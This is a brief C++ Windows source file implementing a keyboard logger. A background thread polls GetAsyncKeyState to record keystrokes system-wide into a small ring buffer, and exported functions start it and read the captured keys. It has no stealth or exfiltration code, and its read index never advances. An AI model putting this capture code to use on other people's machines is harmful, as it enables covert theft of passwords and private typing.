#include "keyboard_logger.h"
#include <windows.h>
#include <thread>
#include <mutex>
#include <vector>

using namespace std;

const int BUFFER_SIZE = 10;

std::vector<unsigned char> keyBuffer(BUFFER_SIZE);
std::mutex bufferMutex;
std::thread keyLoggerThread;
bool loggingActive = false;
int writeIndex = 0;
int readIndex = 0;

void KeyboardLogger() {
    while (loggingActive) {
        for (int key = 8; key <= 255; ++key) {
            if (GetAsyncKeyState(key) & 0x0001) {
                std::lock_guard<std::mutex> lock(bufferMutex);
                keyBuffer[writeIndex] = static_cast<unsigned char>(key);
                writeIndex = (writeIndex + 1) % BUFFER_SIZE;
            }
        }
        Sleep(10);
    }
}

extern "C" void StartKeyboardLogger() {
    if (!loggingActive) {
        loggingActive = true;
        keyLoggerThread = std::thread(KeyboardLogger);
    }
}

extern "C" void GetLastKeys(char* buffer, int* size) {
    std::lock_guard<std::mutex> lock(bufferMutex);
    int count = min(static_cast<int>(BUFFER_SIZE), *size);
    int index = readIndex;
    for (int i = 0; i < count; ++i) {
        buffer[i] = static_cast<char>(keyBuffer[index]);
        index = (index + 1) % BUFFER_SIZE;
    }
    *size = count;
}
